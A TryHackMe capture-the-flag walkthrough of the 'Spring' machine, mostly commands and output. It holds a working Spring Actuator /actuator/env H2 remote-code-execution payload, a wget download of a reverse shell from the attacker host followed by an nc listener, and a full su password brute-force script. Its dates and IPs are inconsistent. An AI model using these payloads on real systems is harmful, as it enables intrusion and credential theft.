---
title: Spring
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Spring machine
  on TryHackMe.
slug: spring
---




```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache Tomcat (language: en)
443/tcp open  ssl/http Apache Tomcat (language: en)

```

```
└─$ curl https://10.67.175.55:443 -k -v
*   Trying 10.67.175.55:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / rsaEncryption
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  start date: Jul  4 15:33:44 2020 GMT
*  expire date: Apr 18 15:33:44 2294 GMT
*  issuer: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to 10.67.175.55 (10.67.175.55) port 443
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.67.175.55
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< Strict-Transport-Security: max-age=31536000 ; includeSubDomains
< X-Frame-Options: DENY
< Content-Type: text/plain;charset=UTF-8
< Content-Length: 13
< Date: Sun, 21 Dec 2025 09:13:15 GMT
< 
* Connection #0 to host 10.67.175.55 left intact
Hello, World!                                                                                                                                             
```

> subject: C=Unknown; ST=Unknown; L=Unknown; O=`spring.thm`; OU=Unknown; CN=`John Smith`

```
dirsearch -u https://10.67.175.55/ \
  -t 200 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -r -R 5

[04:17:41] 302 -    0B  - /sources  ->  /sources/
```

```
└─$ dirsearch -u https://10.67.175.55/ \
  -t 200 \
  -w /home/kali/tryhackme/Spring/small.txt \                       
  -r -R 5

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 3

Output File: /home/kali/tryhackme/Spring/reports/https_10.67.175.55/__25-12-21_05-09-50.txt

Target: https://10.67.175.55/

[05:09:50] Starting: 
[05:09:59] 302 -    0B  - /sources  ->  /sources/                            
Added to the queue: sources/
                                                                             
[05:10:01] Starting: sources/                                                                                                                             
[05:10:08] 302 -    0B  - /sources/new  ->  /sources/new/
Added to the queue: sources/new/
                                                                             
[05:10:08] Starting: sources/new/                                                                                                                         
[05:10:14] 302 -    0B  - /sources/new/.git  ->  /sources/new/.git/
Added to the queue: sources/new/.git/
                                       
```

```
└─$ ./gitdumper.sh http://spring.thm:80/sources/new/.git/ .
###########

#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/1a/83ec34bf5ab3a89096346c46f6fda2d26da7e6
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/92/b433a86a015517f746a3437ba3802be9146722
[+] Downloaded: objects/39/858db3349ea85bfc5b0120dc5d2ca45f0683af
[+] Downloaded: objects/6b/d070178569781eb0534f575e52157aa59a501e
[+] Downloaded: objects/b4/63ef229486f86eeb72b89539bd3339e485807f
[+] Downloaded: objects/5d/eeca1fbb8b02b7a5fbf1776a9b6fc803afda32
[+] Downloaded: objects/8f/8904743c007a1542d0047be84912b7aa15279f
[+] Downloaded: objects/a9/f778a7a964b6f01c904ee667903f005d6df556
[+] Downloaded: objects/eb/f1ef86a29a04cc7ad00bdbc656056a6250e3f6
[+] Downloaded: objects/a4/c5e5165ecd93acf7f243da71430d4edcc2c780
[+] Downloaded: objects/06/e4e487ea33b438eddd5f01d01980e8eb483d54
[+] Downloaded: objects/93/407ced89dfa0d7e574bb117c6bbee7a0d40bc9
[+] Downloaded: objects/0c/304b129922b9739c4193b9a9b71b3050a0867d
[+] Downloaded: objects/0a/e5a6c68f4da02b8cb399eb0b90ead4272d7cd1
[+] Downloaded: objects/0f/4ff745b9480ab23ff47a25542e16094117c35a
[+] Downloaded: objects/d5/c72b751a3a756eb27f4f07664842d252dc4928
[+] Downloaded: objects/98/c8673dc8c0250e15f6a4c4ac7f90a7c8555dbb
[+] Downloaded: objects/69/871575a847bfef00491cd5912a59682b427525
[+] Downloaded: objects/bf/ee42398426f27ae8511e6f4e613207854fdb6d
[+] Downloaded: objects/6d/e5c4c83edbf094c885d02be5f275f589d452ac
[+] Downloaded: objects/6f/b8af92ee8f251b33184e01597255e87459ecb7
[+] Downloaded: objects/67/3abbf42bad7eff6574b6ea8759cea232cf63e7
[+] Downloaded: objects/f6/d1a5ff67503ff152c3be8db995939e22f20da6
[+] Downloaded: objects/71/e18111b0f82be167bcdf44501c40552d9e10ad
[+] Downloaded: objects/9a/8d7e300995dabbb2f0ab9a117f2ee02068aa8d
[+] Downloaded: objects/fc/719eba62e24fd379fd44dc35f1ab25f49ef231
[+] Downloaded: objects/5a/89f76e57f381e38efa3179fd69cf8ee7fd1e54
[+] Downloaded: objects/cc/f5992a16348d803da54a48aa64f24f81569380
[+] Downloaded: objects/66/058471882cd13e7e1229d7df0ecb1437b61e78
[+] Downloaded: objects/f0/f2f7760ac45cfeb34ced824b2abfbc6e436000
[+] Downloaded: objects/5e/a2aaeb59bb380f001a3a1569bb127d4834152a
[+] Downloaded: objects/fd/861389321333ed895fe9c22a79254db774a150
[+] Downloaded: objects/7b/8c746815c823dc9983dc27fc31e69dac3c7bf1
[+] Downloaded: objects/3d/b1ee8004fe3cad3b3637e018abdf443e328e3a
[+] Downloaded: objects/80/c24d20f6bb44e6e2d16aaf133f866a2182f597
[+] Downloaded: objects/e4/9a401d2e07d18bbd9bfc492d71c4467d16d2b3
[+] Downloaded: objects/29/e4f3b4e2234b489d695f8c262c1b4a1b6f6e9a
[+] Downloaded: objects/fe/e60fff5d20f703d74d02fa9a57ed364d9210ee

```

```
 git log
commit 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6 (HEAD -> master)
Author: John Smith <johnsmith@spring.thm>
Date:   Fri Jul 10 18:13:55 2020 +0000

    added greeting
    changed security password to my usual format

commit 92b433a86a015517f746a3437ba3802be9146722
Author: John Smith <johnsmith@spring.thm>
Date:   Sat Jul 4 23:53:25 2020 +0000

    Hello world
    
```

```
git reset --hard 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
HEAD is now at 1a83ec3 added greeting changed security password to my usual format
```

```
find . -ls |grep -v \\.git
  3478264      4 drwxrwxr-x   7 kali     kali         4096 Dec 21 05:04 .
  3478540      8 -rw-rw-r--   1 kali     kali         5441 Dec 21 05:04 ./gradlew
  3478545      4 drwxrwxr-x   4 kali     kali         4096 Dec 21 05:04 ./src
  3478546      4 drwxrwxr-x   4 kali     kali         4096 Dec 21 05:04 ./src/main
  3478555      4 drwxrwxr-x   2 kali     kali         4096 Dec 21 05:04 ./src/main/resources
  3478557      4 -rw-rw-r--   1 kali     kali         2581 Dec 21 05:04 ./src/main/resources/dummycert.p12
  3478556      4 -rw-rw-r--   1 kali     kali         1007 Dec 21 05:04 ./src/main/resources/application.properties
  3478547      4 drwxrwxr-x   4 kali     kali         4096 Dec 21 05:04 ./src/main/java
  3478551      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 05:04 ./src/main/java/com
  3478552      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 05:04 ./src/main/java/com/onurshin
  3478553      4 drwxrwxr-x   2 kali     kali         4096 Dec 21 05:04 ./src/main/java/com/onurshin/spring
  3478554      8 -rw-rw-r--   1 kali     kali         4350 Dec 21 05:04 ./src/main/java/com/onurshin/spring/Application.java
  3478548      4 drwxrwxr-x   2 kali     kali         4096 Dec 21 05:04 ./src/main/java/META-INF
  3478549      4 -rw-rw-r--   1 kali     kali           70 Dec 21 05:04 ./src/main/java/META-INF/MANIFEST.MF
  3478562      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 05:04 ./src/test
  3478563      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 05:04 ./src/test/java
  3478564      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 05:04 ./src/test/java/com
  3478565      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 05:04 ./src/test/java/com/onurshin
  3478566      4 drwxrwxr-x   2 kali     kali         4096 Dec 21 05:04 ./src/test/java/com/onurshin/spring
  3478570      4 -rw-rw-r--   1 kali     kali          214 Dec 21 05:04 ./src/test/java/com/onurshin/spring/ApplicationTests.java
  3478351      4 -rw-rw-r--   1 kali     kali         1151 Dec 21 05:04 ./build.gradle
  3478543      4 -rw-rw-r--   1 kali     kali         3058 Dec 21 05:04 ./gradlew.bat
  3478544      4 -rw-rw-r--   1 kali     kali           28 Dec 21 05:04 ./settings.gradle
  3478534      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 05:04 ./gradle
  3478537      4 drwxrwxr-x   2 kali     kali         4096 Dec 21 05:04 ./gradle/wrapper
  3478538      4 -rw-rw-r--   1 kali     kali          238 Dec 21 05:04 ./gradle/wrapper/gradle-wrapper.properties
  3478343      8 -rwxrwx---   1 kali     kali         4389 Dec 21 04:23 ./gitdumper.sh
  3473309      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 04:17 ./reports
  3478023      4 drwxrwxr-x   2 kali     kali         4096 Dec 21 04:17 ./reports/https_10.67.175.55
  3478234      4 -rw-rw-r--   1 kali     kali         1162 Dec 21 04:47 ./reports/https_10.67.175.55/__25-12-21_04-17-11.txt
  3478388      4 drwxrwxr-x   3 kali     kali         4096 Dec 21 04:30 ./dest-dir
   
```

```
plugins {
    id 'org.springframework.boot' version '2.3.1.RELEASE'
    id 'io.spring.dependency-management' version '1.0.9.RELEASE'
    id 'java'
}
```

```
@RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }

```

```
└─$ curl https://10.67.175.55/?name=pentester -k
Hello, pentester!                                                              
```

```
 @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
```

> ` .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")`

```
 cat ./src/main/resources/application.properties         
server.port=443
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
management.endpoints.enabled-by-default=true
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
management.endpoint.env.keys-to-sanitize=
server.forward-headers-strategy=native
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
server.error.whitelabel.enabled=false
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration
server.servlet.register-default-servlet=true
spring.mvc.ignore-default-model-on-redirect=true
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
debug=false
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
management.endpoint.heapdump.enabled=false
spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/

```

> ssh johnsmith@
> `johnsmith@10.10.149.74: Permission denied (publickey)`

> `server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04`

```
A quick googling show, this this is replacing [`X-Forwarded-For`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header name with `x-9ad42dea0356cb04`. So sending requests with `x-9ad42dea0356cb04` header we can change the IP address server thinks the request is coming from.
```

```
└─$ curl https://10.67.175.55/actuator/ -H 'x-9ad42dea0356cb04: 172.16.0.21' -k -v
*   Trying 10.67.175.55:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / rsaEncryption
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  start date: Jul  4 15:33:44 2020 GMT
*  expire date: Apr 18 15:33:44 2294 GMT
*  issuer: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to 10.67.175.55 (10.67.175.55) port 443
* using HTTP/1.x
> GET /actuator/ HTTP/1.1
> Host: 10.67.175.55
> User-Agent: curl/8.15.0
> Accept: */*
> x-9ad42dea0356cb04: 172.16.0.21
> 
* Request completely sent off
< HTTP/1.1 200 
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< Strict-Transport-Security: max-age=31536000 ; includeSubDomains
< X-Frame-Options: DENY
< Content-Type: application/vnd.spring-boot.actuator.v3+json
< Transfer-Encoding: chunked
< Date: Sun, 21 Dec 2025 10:32:07 GMT
< 
* Connection #0 to host 10.67.175.55 left intact
{"_links":{"self":{"href":"https://10.67.175.55/actuator","templated":false},"beans":{"href":"https://10.67.175.55/actuator/beans","templated":false},"health":{"href":"https://10.67.175.55/actuator/health","templated":false},"health-path":{"href":"https://10.67.175.55/actuator/health/{*path}","templated":true},"shutdown":{"href":"https://10.67.175.55/actuator/shutdown","templated":false},"env-toMatch":{"href":"https://10.67.175.55/actuator/env/{toMatch}","templated":true},"env":{"href":"https://10.67.175.55/actuator/env","templated":false},"mappings":{"href":"https://10.67.175.55/actuator/mappings","templated":false},"restart":{"href":"https://10.67.175.55/actuator/restart","templated":false}}} 
```

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATEALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\'java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 192.168.153.193\');\"}' "https://10.67.175.55/actuator/env" -k

{"spring.datasource.hikari.connection-test-query":"CREATEALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new','java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('ping -c 5 192.168.153.193');"}                                                                                                                                                          
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://10.67.175.55/actuator/restart" -k
{"message":"Restarting"}                                                                                                                                  
```

> Create reverse shell `rev.sh`

> To upload rev shell into victim

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://192.168.153.193/rev.sh -O /tmp/rev.sh\');\"}' "https://spring.thm/actuator/env" -k

{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://192.168.153.193/rev.sh -O /tmp/reverse.sh');"}                                                                                                                                                          
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://spring.thm/actuator/restart" -k

{"message":"Restarting"}   

python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.153.193 - - [21/Dec/2025 06:06:42] "GET /rev.sh HTTP/1.1" 200 -

```

> Now have to execute

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/rev.sh\');\"}' "https://spring.thm/actuator/env" -k

{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('bash /tmp/rev.sh');"}                    

curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://spring.thm/actuator/restart" -k

{"message":"Restarting"}                                                                                                                                     

nc -lvnp 9000
listening on [any] 9000 ...
connect to [192.168.153.193] from (UNKNOWN) [10.67.171.206] 44120
bash: cannot set terminal process group (1016): Inappropriate ioctl for device
bash: no job control in this shell
nobody@spring:/$
```

> get linpeas and run

```
[-] Environment information:
LANG=en_US.UTF-8
SUDO_GID=0
OLDPWD=/opt
USERNAME=root
SUDO_COMMAND=/bin/su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.security.egd=file:///dev/urandom -jar /opt/spring/sources/new/spring-0.0.1-SNAPSHOT.jar --server.ssl.key-store=/opt/privcert.p12 --server.ssl.key-store-password=PrettyS3cureKeystorePassword123.
XDG_SESSION_ID=c1
USER=nobody
PWD=/tmp
HOME=/nonexistent
SUDO_USER=root
SUDO_UID=0
MAIL=/var/mail/nobody
TERM=unknown
SHELL=/bin/bash
SHLVL=5
LOGNAME=nobody
XDG_RUNTIME_DIR=/run/user/65534
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
_=/usr/bin/env

```

> So we have 2 passwords;

> found a very similar password there and commit `was saying changed security password to my usual format`

```
PrettyS3cureKeystorePassword123
PrettyS3cureSpringPassword123.

```

> Let's grep rockyou.txt for capitalized words;

```
cat rockyou.txt | grep -E ^[A-Z][a-z]+$ > capitalized_words.txt
```

> need to find a way to brute force johnsmith's password, problem is ssh is `publickey` only so we have to use `su`. We might use [sucrack](http://www.leidecker.info/projects/sucrack.shtml) but it is easy enough to script it so let's go with scripting;

```
#!/bin/bash

set -m #enable job control
export TOP_PID=$$ #get the current PID
trap "trap - SIGTERM && kill -- -$$" INT SIGINT SIGTERM EXIT #exit on trap

# https://github.com/fearside/ProgressBar/blob/master/progressbar.sh
# something to look at while waiting
function progressbar {
        let _progress=(${1}*100/${2}*100)/100
        let _done=(${_progress}*4)/10
        let _left=40-$_done

        _done=$(printf "%${_done}s")
        _left=$(printf "%${_left}s")

        printf "\rCracking : [${_done// /#}${_left// /-}] ${_progress}%%"
}

function brute() {
        keyword=$1 #get the word
        password="PrettyS3cure${keyword}Password123." #add it to our format
        output=$( ( sleep 0.2s && echo $password ) | script -qc 'su johnsmith -c "id"' /dev/null) # check the password
        if [[ $output != *"Authentication failure"* ]]; then #if password was correct
                printf "\rCreds Found! johnsmith:$password\n$output\nbye..." #print the password
                kill -9 -$(ps -o pgid= $TOP_PID  | grep -o '[0-9]*') #kill parent and other jobs
        fi
}

wordlist=$1 #get wordlist as parameter

count=$(wc -l $wordlist| grep -o '[0-9]*') #count how many words we have
current=1

while IFS= read -r line #for each line
do
        brute $line & #try the password
        progressbar ${current} ${count} #update progress bar. TODO:calculate ETA
        current=$(( current + 1 )) #increment
done < $wordlist #read the wordlist

wait #wait for active jobs

```

> run this

```
time bash su_brute_force.sh capitalized_words.txt

nobody@spring:/tmp$ time bash su_brute_force.sh capitalized_words.txt
time bash su_brute_force.sh capitalized_words.txt
Creds Found! johnsmith:PrettyS3cure..........Password123.7%
Password: 
uid=1000(johnsmith) gid=1000(johnsmith) groups=1000(johnsmith)

```

```
nobody@spring:/dev/shm$ su johnsmith
su johnsmith
Password: PrettyS3cure......Password123.

johnsmith@spring:/dev/shm$ id
id
uid=1000(johnsmith) gid=1000(johnsmith) groups=1000(johnsmith)

```

```
johnsmith@spring:~$ cat /etc/systemd/system/spring.service    
cat /etc/systemd/system/spring.service
[Unit]
Description=Spring Boot Application
After=syslog.target
StartLimitIntervalSec=0

[Service]
User=root
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh

[Install]
WantedBy=multi-user.target
johnsmith@spring:~$ systemctl status spring
systemctl status spring
WARNING: terminal is not fully functional
-  (press RETURN)
● spring.service - Spring Boot Application
   Loaded: loaded (/etc/systemd/system/spring.service; enabled; vendor preset: e
   Active: active (running) since Sun 2025-12-21 11:57:09 UTC; 20min ago
 Main PID: 19917
    Tasks: 3 (limit: 479)
   CGroup: /system.slice/spring.service
           ├─19917 /bin/bash /root/start_tomcat.sh
           ├─19933 sudo su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-am
           └─19935 tee /home/johnsmith/tomcatlogs/1766318229.log
lines 1-9/9 (END)

```

```
johnsmith@spring:~/tomcatlogs$ nano get_root.sh
johnsmith@spring:~/tomcatlogs$ bash get_root.sh
{"message":"Shutting down, bye..."}
whoami
Hello, ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILKTKMqNsInLM2tkn0LUwUH1ejRM1tm39w7FT9joN17E johnsmith@spring!Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.

whoami
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 20 11:24:59 UTC 2020

  System load:  0.62               Processes:           101
  Usage of /:   11.7% of 58.80GB   Users logged in:     1
  Memory usage: 35%                IP address for eth0: 10.10.6.25
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

9 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@spring:~# ls
root.txt  start_tomcat.sh
root@spring:~# cat root.txt
THM{sshd_does_not_mind_the_junk}
root@spring:~#
```